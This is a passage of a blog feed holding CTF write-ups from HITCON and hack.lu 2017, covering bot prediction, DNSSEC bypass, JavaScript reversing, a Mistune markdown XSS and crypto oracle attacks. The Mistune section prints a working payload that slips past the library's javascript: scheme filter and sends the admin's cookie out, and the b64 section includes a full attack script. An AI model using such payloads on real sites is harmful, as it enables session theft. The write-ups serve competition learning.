+<li>Slime bot: this&#8217;s the most simple bot, which generate next move as <code>next_move = (last_move+1) mod 3</code>.</li>
+<li>Alpaca bot: this bot generate next move by using state transform formula <code>number = last_user_move + number - 0x61C88647;</code> which <code>number</code> is <code>unsigned int</code> and first generated using a true random generator, and then calculate its move as <code>number mod 3</code>.</li>
+<li>Nozomi bot: this&#8217;s a more advanced bot which at first frightened me from understanding its state transform function (below), but after some google it&#8217;s turned out to be Park and Miller #2 RNG.</li>
+</ol>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">// decompiled code
+tmp = 48271 * number * (unsigned __int128)0x200000005uLL &gt;&gt; 64;
+number = 48271 * number - 0x7FFFFFFF * ((tmp + ((48271 * number - tmp) &gt;&gt; 1)) &gt;&gt; 30);
+// Park and Miller #2 RNG
+__uint64_t pm(__uint64_t x){
+ return (x*48271)%0x7FFFFFFF;
+}</pre>
+<p>First we need a way to detect the current bot we&#8217;re facing with, the easiest way is using game-counter variable but will lead into problem with 100 randomized game. We need to win 90 000 games, which mean we can lose 10 000 games, that&#8217;s a lot, so i spend 30 first moves to decide which&#8217;s the bot we&#8217;re facing:</p>
+<ol>
+<li><strong>Slime bot</strong>: Its formula is easy to verify, if all the first 30 moves are in the pattern 0,1,2,0,1,2,0,1,2&#8230; then that&#8217;s it.</li>
+<li><strong>Alpaca bot</strong>: At first i think this bot&#8217;s so easy, as <code>0x61C88647 mod 3 = 1</code> we just need to keep sending <code>1</code> as our move for the first 30 moves and then the <code>number</code> variable wont be changed. I was wrong. But luckily checking for number of unchanged moves is enough to verify this bot, which 50% of the moves must not be changed if we keep sending move <code>1</code>.</li>
+<li><strong>Nozomi bot</strong>: Simple, if it isnt slime, and isnt alpaca, then that&#8217;s it.</li>
+</ol>
+<p>Now&#8217;s the time for &#8220;AI&#8221;:</p>
+<ol>
+<li><strong>Slime bot</strong>: bot&#8217;s next move is <code>(last_move+1)%3</code>, easy.</li>
+<li><strong>Alpaca bot</strong>: due to the overflow problem, i thought this&#8217;s a RE problem first and move to other problems, but then @trichimtrich found out the problem. Subtracting <code>number</code> by <code>0x61C88647</code> frequency overflow the operation, which add into it a factor of <code>2^32 mod 3 = 1</code>,  he completed solution for this bot and i ported to lua. Primary idea is that each time our predict move is different from the actual move, <code>number</code> must have been overflowed, we just need to keep a range that move the same speed as <code>number</code> to check for overflow and adjust the modulo value when our current predicted value is out or in of that range.</li>
+<li><strong>Nozomi bot</strong>: as the function is a <code>PRNG</code> which distributes sample equally within <code>[0, 0x7FFFFFFF]</code>, we can somehow precompute a table of <code>2 000 000</code> samples which can be checked easily when <code>number</code> go into that table. I decided to use last 20 moves encoded in base 3 as key for the table. The probability that we failed to catch this table after 7000 moves is<code>((0x7FFFFFFF-2000000)/0x7FFFFFFF)^7000 = 0.00147029</code>, so our success rate is above <code>99%</code>.</li>
+</ol>
+<p>Final code that solved all these problems:</p>
+<p>View the code on <a href="https://gist.github.com/vanhoavn/8a969f6e329565351c20fff0331f2370">Gist</a>.</p>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+]]></content:encoded>
+			<wfw:commentRss>https://www.vhn.vn/blog/index.php/2017/11/06/hitcon-ctf-2017-quals/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">163</post-id>	</item>
+		<item>
+		<title>hack.lu 2017</title>
+		<link>https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/</link>
+		<comments>https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/#respond</comments>
+		<pubDate>Thu, 19 Oct 2017 15:47:46 +0000</pubDate>
+		<dc:creator><![CDATA[vanhoavn]]></dc:creator>
+				<category><![CDATA[CTF]]></category>
+
+		<guid isPermaLink="false">https://www.vhn.vn/blog/?p=126</guid>
+		<description><![CDATA[]]></description>
+				<content:encoded><![CDATA[<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Misc, Web) DnSoSecure - by kunte_, utnubu -100 (+ 100)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<p>We found this <a href="https://dnsosecure.flatearth.fluxfingers.net/">Flag-Submission-Service</a> that is used by the OTHER-SIDE. Try to get it to submit the flag to you!</div></div>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p>View source give us the <a href="https://www.vhn.vn/blog/wp-content/uploads/2017/10/source.zip">source of this challenge</a>:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="html">&lt;!-- &lt;a href="/static/source.zip"&gt;Source&lt;/a&gt; --&gt;</pre>
+<p>Index file validating the input text and do the secret:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python"># views.py
+...
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    form = DNSServer()
+    if form.validate_on_submit():
+        ip = correct_dnssec(form.dnsip.data, app.config['DOMAIN'])
+        if ip:
+            if check_ipv4(ip):
+                send_secret(ip, app.config['FLAG'], app.config['PORT'])
+            flash('Sending data ... ', 'success')
+        else:
+            flash('Error!', 'error')
+    return render_template('index.html', form=form)
+...
+# utils.py
+...
+
+def correct_dnssec(nsaddr, domain):
+    #
+    name = dns.name.from_text(domain)
+    key = {
+        name: dns.rrset.from_text(
+            domain, 3600, 'IN', 'DNSKEY',
+            '256 3 7 AwEAAeJd3Xyd8l3rWDx46UwPMyLOSVcbuwDgEvt2iEWTAghVbpw5M2YN 0GxUqa6vWI/RAhSynF4fxSvp1z3PnKBFle/Qxz7MzfPgH0spzriWsP8k qjs0Y9/xJU0tzZJ2TrIypdmEqpKtMbs3gRrrADz8pr/AdI7bjvX4r6Oh ty04lG8zyj1wwuWXi/oVfk1rTD9I2aq7SWK9REnueUFRsshMLQK5Vgpo Row0HmrE7Peg59lFFSi54rSJivb/4Tb0P8AtIlIUW0ZZOR9E/MsswWFZ Qw56A0Z5LJK4t8RmV5+vAhflNn/uTSEOpC08vUqkNQbOBXr1Ie/t57H6 ywvsKwEYo9s=',
+            '257 3 7 AwEAAdth+HteT0kUim5+hOkyTpMU1FbNfxjn7otvpcA0ZSb/37Tr+WRJ l1nmzHkmrW+gJuzj5M+1QPEv41CujWe8EdGOyA3jM2KENj7NMdiNjh1G puzQa7YFxR4z5SG8+M5zvO5F3CTFWU5tZCTzkvk4Zbs5aJ3RZ6Zk1EBK xwoKz1CGCoedBM1VcKwJ2H+NT15m1cb/AfsSEljTyvruUUiJo84+MRPh luYtPrVKIwnHe6qxvhLSvpG0HFNNkBudy/TOf7C51zmdkpW+3hvbzp/I 79LEuXyYwXft4vpxKNv4zTGOoXNrBAxHcfmvAJsplIzSGcM84yRD+oWm Pu/WF+ESuPv9bmws0hZ2L2+dLpKZjDjb8ppxFS/zJFfWqqErRWssQo64 4lET6m2qET1g22YeB5iLAhVfAmTMZtxnhLqSHJ1EdQIwKm3RJfUsr+z+ Wxb9BZS/P2OSUsSzLOQ7hWjViCE45JMW0gGnMrvSeloAePtvYasfBjaT IDhW2knhKVr2ZoJ6I7pvZBrc/hLB2NGiFaN2otLwIX6InRTT8zrndDY8 uXwVsrBH/4UXy0CIf0PNwjqyFTALSx2DYGW1aU9y0wiZbX5h3msJGRO3 eiHP6QNv+bQJ3f1isMuaAFXT07gcfrAVYT72clU5Nep1Dp6hBfmkfnGT jhiPj16+cfJerrIP'
+        )
+    }
+    request = dns.message.make_query(domain, dns.rdatatype.A, want_dnssec=True)
+    try:
+        request = dns.query.udp(request, nsaddr, timeout=7)
+    except:
+        return False
+    answer = request.answer
+    if len(answer) &lt; 2:
+        # dnsserc not supported
+        return False
+    else:
+        try:
+            dns.dnssec.validate(answer[0], answer[1], key)
+            return str(answer[0].to_rdataset()[0])
+        except:
+            # dnssec failed
+            return False
+
+</pre>
+<p>So this problem is faking DNS and *bypass* the dnssec checker function, after a while trying to crack that public key, i found out that the source contain <code>.git</code>, checkout the branch <code>eddb23375ea4e08c67a63088ea08b4d5fc18a406</code> give us the private keys and that&#8217;s enough to build a dns server for this problem.</p>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Web, Rev) Triangle - by kunte_ -100 (+ 64)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<p>Everything is controlled by the <a href="https://triangle.flatearth.fluxfingers.net/">Triangle</a>!</p>
+</div></div>
+<p><span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;"><div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden"></span></p>
+<p>It&#8217;s just a basic js-only webpage which check login by following function:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">function login(){
+  var input = document.getElementById('password').value;
+  var enc = enc_pw(input);
+  var pw = get_pw();
+  if(test_pw(enc, pw) == 1){
+    alert('Well done!');
+  }
+  else{
+    alert('Try again ...');
+  }
+}</pre>
+<p>These methods defined in <code>secret.js</code>, simple deobfucating give us:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">function test_pw(e, _) {
+    var t = stoh(atob(getBase64Image("eye"))),
+        r = 4096,
+        m = 8192,
+        R = 12288,
+        a = new uc.Unicorn(uc.ARCH_ARM, uc.MODE_ARM);
+    a.reg_write_i32(uc.ARM_REG_R9, m), a.reg_write_i32(uc.ARM_REG_R10, R), a.reg_write_i32(uc.ARM_REG_R8, _.length), a.mem_map(r, 4096, uc.PROT_ALL);
+    for (var o = 0; o &lt; o1.length; o++) a.mem_write(r + o, [t[o1[o]]]);
+    a.mem_map(m, 4096, uc.PROT_ALL), a.mem_write(m, stoh(_)), a.mem_map(R, 4096, uc.PROT_ALL), a.mem_write(R, stoh(e));
+    var u = r,
+        c = r + o1.length;
+    return a.emu_start(u, c, 0, 0), a.reg_read_i32(uc.ARM_REG_R5)
+}
+
+function enc_pw(e) {
+    var _ = stoh(atob(getBase64Image("frei"))),
+        t = 4096,
+        r = 8192,
+        m = 12288,
+        R = new uc.Unicorn(uc.ARCH_ARM, uc.MODE_ARM);
+    R.reg_write_i32(uc.ARM_REG_R8, r), R.reg_write_i32(uc.ARM_REG_R9, m), R.reg_write_i32(uc.ARM_REG_R10, e.length), R.mem_map(t, 4096, uc.PROT_ALL);
+    for (var a = 0; a &lt; o2.length; a++) R.mem_write(t + a, [_[o2[a]]]);
+    R.mem_map(r, 4096, uc.PROT_ALL), R.mem_write(r, stoh(e)), R.mem_map(m, 4096, uc.PROT_ALL);
+    var o = t,
+        u = t + o2.length;
+    return R.emu_start(o, u, 0, 0), htos(R.mem_read(m, e.length))
+}
+
+function get_pw() {
+    for (var e = stoh(atob(getBase64Image("templar"))), _ = "", t = 0; t &lt; o3.length; t++) _ += String.fromCharCode(e[o3[t]]);
+    return _
+}</pre>
+<p>So both <code>test_pw</code> and <code>enc_pw</code> use Unicorn to emulate some ARM code, obtaining these memory images and load into IDA give us:</p>
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-arrow su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>test_pw assembly</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<pre class="EnlighterJSRAW" data-enlighter-language="asm">ROM:00000000 sub_0
+ROM:00000000                 MOV             R0, R9
+ROM:00000004                 MOV             R1, R10
+ROM:00000008                 MOV             R3, R8
+ROM:0000000C                 MOV             R4, #0
+ROM:00000010                 MOV             R5, #0
+ROM:00000014                 MOV             R12, #0
+ROM:00000018
+ROM:00000018 loop                                    ; CODE XREF: sub_0+4C↓j
+ROM:00000018                 LDRB            R2, [R0]
+ROM:0000001C                 LDRB            R6, [R1]
+ROM:00000020                 ADD             R6, R6, #5
+ROM:00000024                 AND             R12, R4, #1
+ROM:00000028                 CMP             R12, #0
+ROM:0000002C                 BEQ             r4_le
+ROM:00000030                 SUB             R6, R6, #3
+ROM:00000034
+ROM:00000034 r4_le                                   ; CODE XREF: sub_0+2C↑j
+ROM:00000034                 CMP             R2, R6
+ROM:00000038                 BNE             fail
+ROM:0000003C                 ADD             R0, R0, #1
+ROM:00000040                 ADD             R1, R1, #1
+ROM:00000044                 ADD             R4, R4, #1
+ROM:00000048                 CMP             R4, R3
+ROM:0000004C                 BLT             loop
+ROM:00000050                 MOV             R5, #1
+ROM:00000054
+ROM:00000054 fail                                    ; CODE XREF: sub_0+38↑j
+ROM:00000054                 MOV             R0, #0
+ROM:00000058                 MOV             R1, #0
+ROM:0000005C                 MOV             R2, #0
+ROM:00000060                 MOV             R3, #0
+ROM:00000064                 MOV             R4, #0
+ROM:00000068                 MOV             R6, #0
+ROM:0000006C                 MOV             R7, #0
+ROM:00000070                 MOV             R8, #0
+ROM:00000074                 MOV             R9, #0
+ROM:00000078                 MOV             R10, #0
+ROM:0000007C                 MOV             R12, #0
+ROM:0000007C ; End of function sub_0</pre>
+</div></div>
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-arrow su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>enc_pw assembly</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<pre class="EnlighterJSRAW" data-enlighter-language="asm">ROM:00000000 sub_0
+ROM:00000000                 MOV             R0, R8
+ROM:00000004                 MOV             R1, R9
+ROM:00000008                 MOV             R2, R10
+ROM:0000000C                 MOV             R3, #0
+ROM:00000010                 MOV             R5, #0
+ROM:00000014
+ROM:00000014 loop                                    ; CODE XREF: sub_0+44↓j
+ROM:00000014                 LDRB            R4, [R0]
+ROM:00000018                 CMP             R5, #1
+ROM:0000001C                 BNE             r4_branch
+ROM:00000020                 AND             R6, R3, #3
+ROM:00000024                 ADD             R4, R4, R6
+ROM:00000028
+ROM:00000028 r4_branch                               ; CODE XREF: sub_0+1C↑j
+ROM:00000028                 ADD             R4, R4, #6
+ROM:0000002C                 AND             R5, R4, #1
+ROM:00000030                 STRB            R4, [R1]
+ROM:00000034                 ADD             R0, R0, #1
+ROM:00000038                 ADD             R1, R1, #1
+ROM:0000003C                 ADD             R3, R3, #1
+ROM:00000040                 CMP             R3, R2
+ROM:00000044                 BLT             loop
+ROM:00000048                 MOV             R0, #0
+ROM:0000004C                 MOV             R1, #0
+ROM:00000050                 MOV             R2, #0
+ROM:00000054                 MOV             R3, #0
+ROM:00000058                 MOV             R4, #0
+ROM:0000005C                 MOV             R5, #0
+ROM:00000060                 MOV             R6, #0
+ROM:00000064                 MOV             R7, #0
+ROM:00000068                 MOV             R9, #0
+ROM:0000006C                 MOV             R10, #0
+ROM:0000006C ; End of function sub_0
+</pre>
+</div></div>
+<p>Rewrite these functions using php:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">&lt;?php
+function test_pw($e, $p) {
+  for($i=0;$i&lt;strlen($p);$i++) {
+    if (ord($e[$i]) !== ord($p[$i]) - (($i%2)?2:5)) return false; 
+  }
+  return true;
+}
+
+function enc_pw($p) {
+  $len = strlen($p);
+  $last_is_odd = 0;
+  $res = "";
+  for($i=0;$i&lt;$len;$i++) {
+    $c = ord($p[$i]) + (($last_is_odd)?($i%4):(0)) + 6;
+    $res .= chr($c);
+    $last_is_odd = $c % 2;
+  };
+  return $res;
+}
+?&gt;
+
+</pre>
+<p>Then it&#8217;s easy to revert these functions:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">&lt;?php
+function get_pw_from_test($p){
+  $r = "";
+  for($i=0;$i&lt;strlen($p);$i++) {
+    $r.=chr(ord($p[$i]) - (($i%2)?2:5));
+  }
+  return $r;
+}
+function dec_pw($p) {
+  $r = "";
+  for($i=strlen($p)-1;$i&gt;=0;$i--){
+    $last_is_odd = $i&gt;0 &amp;&amp; ord($p[$i-1]) % 2;
+    $r = chr(ord($p[$i]) - 6 - ($last_is_odd?($i%4):0)).$r;
+  }
+  return $r;
+}
+?&gt;</pre>
+<p>And then it&#8217;s easy to get the code:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">&lt;?php
+$enc_pass = get_pw_from_test(get_pw());
+var_dump(test_pw($enc_pass, get_pw()));
+$pass = dec_pw($enc_pass);
+var_dump(enc_pw($pass)==$enc_pass);
+var_dump($pass, $enc_pass);
+?&gt;</pre>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">CODE</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">MPmVH94PTH7hhafgYahYaVfKJNLRNQLZ</div></div>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Web) Mistune - by kunte_ -150 (- 18)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">Markdown parsers are fun. Now click <a href="https://mistune.flatearth.fluxfingers.net/">here</a> and steal the cookie!</div></div>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p>It&#8217;s a markdown-rendering service which we can test output of their internal markdown renderer and can submit messages to admin using markdown.</p>
+<p>&nbsp;</p>
+<div class="su-quote su-quote-style-default su-quote-has-cite"><div class="su-quote-inner su-clearfix">Try to steal the cookie!</p>
+<p>We use mistune.Renderer(escape=True, hard_wrap=True)</p>
+<p>The admin will look at your converted Markdown.</p>
+<p>The admin will click on links (&lt;a/&gt;). <span class="su-quote-cite">DnSoSecure - hacklu 2017</span></div></div>
+<p>So this problem is definitely XSS and require us to obtain cookie of admin. Finding source of mistune give us</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python"># https://github.com/lepture/mistune/blob/master/mistune.py
+...
+_scheme_blacklist = ('javascript:', 'vbscript:')
+...
+def escape_link(url):
+    """Remove dangerous URL schemes like javascript: and escape afterwards."""
+    lower_url = url.lower().strip('\x00\x1a \n\r\t')
+    for scheme in _scheme_blacklist:
+        if lower_url.startswith(scheme):
+            return ''
+    return escape(url, quote=True, smart_amp=False)
+</pre>
+<p>So <code>javascript:</code> scheme urls will be black out, but we can easily bypass that by using carriage return character <code>"javascript\r:document.location.href=(...)+document.cookie"</code>, and then just wait for the flag, we can input that carriage return by running command in console:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">$("textarea").replaceWith($('&lt;input type="hidden" name="text"/&gt;').val('[link](javascript\r:document.location.href=(...)+document.cookie)'))</pre>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Crypto) b64 - by Sceptic -100 (+ 66)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<p>Taking part in elite, exclusive groups entails being able to hide secrets from the lesser folk and only provide it to the gifted. Our intern recently proposed a solution to do just that.</p>
+<p>nc flatearth.fluxfingers.net 1718</p>
+<p><a href="https://www.vhn.vn/blog/wp-content/uploads/2017/10/b64-1e3d68559bf59696b8233d66321a90eb.zip">Download</a><br />
+</div></div>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p>Problem source:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python2
+
+import flag from flag
+from base64 import b64decode
+from SocketServer import ThreadingTCPServer
+from sys import argv
+from binascii import hexlify, unhexlify
+import SocketServer
+import os
+
+N = 8
+MAX_TRIES = 1024
+PAD = 64
+
+welcome = "Welcome! :-)\n"
+menu = "What would you like to do:\n\t1: supply encoded input,\n\t2: tell me my secret\n&gt; "
+
+def gen_secret():
+    return os.urandom(N)
+
+def crypt(s1, s2):
+    return "".join(map(lambda c: chr(((ord(c[0])^ord(c[1]))+PAD)%256), zip(s1,s2)))
+
+b64chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/"
+def decode(s, secret):
+    enc = ""
+    s = crypt(s, secret)
+    
+    for c in s:
+        if c in b64chars:
+            enc+=c
+
+    if len(enc) % 4 == 1:
+        enc = enc[:-1]
+
+    while len(enc) % 4 != 0:
+        enc+="="
+
+    return b64decode(enc)
+
+class B64Handler(SocketServer.BaseRequestHandler):
+    def setup(self):
+        self.tries = 0
+        self.secret = gen_secret()
+
+    def handle(self):
+        self.request.send(welcome)
+        for i in range(MAX_TRIES):
+            self.request.send("Round number: {}\n{}".format(i, menu))
+            if self.request.recv(2)[0] == "1":
+                self.request.send("What would you like me to decode?\n&gt; ")
+                answer = self.request.recv(len(self.secret))
+                decoded = decode(answer, self.secret)
+                self.request.send("Alright, here is your answer: {}\n".format(decoded))
+
+            else:
+                self.request.send("Alright, what is my secret (hex encoded)?\n&gt; ")
+                answer = self.request.recv(2*len(self.secret)+1).rstrip()
+                if answer==hexlify(self.secret):
+                    self.request.send("Well done, here is your flag: {}\n".format(flag))
+                else:
+                    self.request.send("This was not what I was looking for. :-(\n")
+                break
+
+        self.request.send("Bye!\n")
+
+def main():
+    SocketServer.ThreadingTCPServer.allow_reuse_address = True
+    if len(argv) &lt; 2:
+        print("Usage: {} &lt;PORT&gt;".format(argv[0]))
+    else:
+        LOCAL_PORT = int(argv[1])
+        s = SocketServer.ThreadingTCPServer(("", LOCAL_PORT), B64Handler)
+        try:
+            s.serve_forever()
+        except KeyboardInterrupt:
+            print("shutting down")
+            s.shutdown()
+            s.socket.close()
+
+if __name__ == "__main__":
+    main()</pre>
+<p>For each new session, the server create a new random message, allow us to <code>decode</code> <code>MAX_TRIES</code> message with provided <code>crypt</code> function and then filter only base64 compatible characters into a new string, remove the last character if that string length divide 4 remain 1, and finally base64-decode that string.</p>
+<p>We can easily findout the secret message by enumerating each byte, except for byte 0 and 4 we need to enumerate 2 bytes, but only enumerating the 4 MSBs are enough, so 1 + 256*2 + 16*6 = 609 tries in worst case, which&#8217;s very enough.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python                                                               
+import struct                                                                   
+import socket                                                                   
+import telnetlib                                                                
+import sys, time
+import base64                                                   
+import string
+import re
+import random
+from binascii import hexlify, unhexlify
+import itertools
+
+def recv_utils(s,r,ss):
+  while all([not(sss in r) for sss in ss]):
+    sa = s.recv(4096)
+    r += sa
+  return r
+
+
+def check(ss):
+  s.send("1\n")
+  recv_utils(s, '', ['What would you like me to decode'])
+  s.send(ss)
+  ans = recv_utils(s, '', ['Alright, here is your answer: '])
+  r = re.search(r'here is your answer: (.*?)\n', ans)
+  r = r.group(1)
+  return base64.b64encode(r).rstrip('=')
+
+def decrypt(e, s):
+  return "".join(map(lambda c: chr(((((ord(c[0])+256-64)%256)^ord(c[1])))%256), zip(e,s)))
+
+while True:
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+  s.connect(('flatearth.fluxfingers.net', 1718)) 
+
+  if len(check("\x00"*8)) and len(check("\x01"*8)) &gt; 0:
+    s.close()
+    continue
+    
+  buf = ["\x00"] * 8
+  ss = True
+  i = 0
+  while i &lt; 8:
+    print "Check %d" % (i)
+    nlen = 2 if (i%4)==0 else 1
+    ssfail = 0
+    for ntry in range(16**nlen):
+      sys.stdout.write(str(ntry%10))
+      sys.stdout.flush()
+      if nlen == 1:
+        buf[i] = chr(ntry*16+1)
+      else:
+        buf[i  ] = chr((ntry//16)*16+1)
+        buf[i+1] = chr((ntry%16)*16+15-1)
+      chk = check("".join(buf))
+      if len(chk)&lt;i:
+        sys.stdout.write('.')
+        sys.stdout.flush()
+        continue
+      if len(chk)&gt;=i+nlen:
+        break
+      else:
+        ssfail += 1
+    print
+    if ssfail == 16**nlen:
+      ss = False
+      break
+    i += nlen
+  
+  if not(ss):
+    s.close()
+    continue
+  
+  buf = "".join(buf)
+  enc = check(buf)
+  print 'buf = ', buf.encode("hex")
+  print 'enc = ', enc.encode("hex")
+  x = decrypt(enc, buf)
+  print 'x = ', x
+  s.send("2\n" + hexlify(x)+"\n")
+  r = recv_utils(s, '', ['flag', 'looking for'])
+  print r
+  if 'flag' in r:
+    break</pre>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Crypto) prime enigma - by midao - 50 (+ 100)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<p>Hey there fellow lizard how nice of you to drop by! Did you know those filthy humans really think that some numbers have special meanings? Seven, 13 and for some strange reason even 9000. Go and show them that a good prime does not make a secure cryptosystem!</p>
+<p><a href="https://www.vhn.vn/blog/wp-content/uploads/2017/10/prime-enigma-9611097c559105b8c7dc7da88b973d78.zip">Link</a></p>
+</div></div>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p>This problem encrypt message by using some big exponent as private key, provide us the cipher message and a hint number.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">from secret import flag, key
+
+f = open('ciphertext.txt', 'w')
+
+p = 104438888...4758453247 # 1234 characters number
+g = 5
+A = 102631253....429994312 # 1234 characters number
+d = key
+m = int(flag.encode('hex'), 16) % p
+
+B = pow(g, d, p)
+k = pow(A, d, p)
+c = k * m % p
+
+f.write(str(B) + '\n')
+f.write(str(c) + '\n')
+
+f.close()
+</pre>
+<p>Looking at <code>ciphertext.txt</code> show that <code>B == p - 1</code>, so <code>g^d = -1 mod p</code>, so d maybe (p-1)/2, just try it and that give us the flag:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python
+
+from fractions import gcd
+B = 1044388881413152506679602719846529545831269060992135009022588756444338172022322690710444046669809783930111585737890362691860127079270495454517218673016928427459146001866885779762982229321192368303346235204368051010309155674155697460347176946394076535157284994895284821633700921811716738972451834979455897010306333468590751358365138782250372269117968985194322444535687415522007151638638141456178420621277822674995027990278673458629544391736919766299005511505446177668154446234882665961680796576903199116089347634947187778906528008004756692571666922964122566174582776707332452371001272163776841229318324903125740713574141005124561965913888899753461735347970011693256316751660678950830027510255804846105583465055446615090444309583050775808509297040039680057435342253926566240898195863631588888936364129920059308455669454034010391478238784189888594672336242763795138176353222845524644040094258962433613354036104643881925238489224010194193088911666165584229424668165441688927790460608264864204237717002054744337988941974661214699689706521543006262604535890998125752275942608772174376107314217749233048217904944409836238235772306749874396760463376480215133461333478395682746608242585133953883882226786118030184028136755970045385534758453246
+p = 1044388881413152506679602719846529545831269060992135009022588756444338172022322690710444046669809783930111585737890362691860127079270495454517218673016928427459146001866885779762982229321192368303346235204368051010309155674155697460347176946394076535157284994895284821633700921811716738972451834979455897010306333468590751358365138782250372269117968985194322444535687415522007151638638141456178420621277822674995027990278673458629544391736919766299005511505446177668154446234882665961680796576903199116089347634947187778906528008004756692571666922964122566174582776707332452371001272163776841229318324903125740713574141005124561965913888899753461735347970011693256316751660678950830027510255804846105583465055446615090444309583050775808509297040039680057435342253926566240898195863631588888936364129920059308455669454034010391478238784189888594672336242763795138176353222845524644040094258962433613354036104643881925238489224010194193088911666165584229424668165441688927790460608264864204237717002054744337988941974661214699689706521543006262604535890998125752275942608772174376107314217749233048217904944409836238235772306749874396760463376480215133461333478395682746608242585133953883882226786118030184028136755970045385534758453247
+g = 5
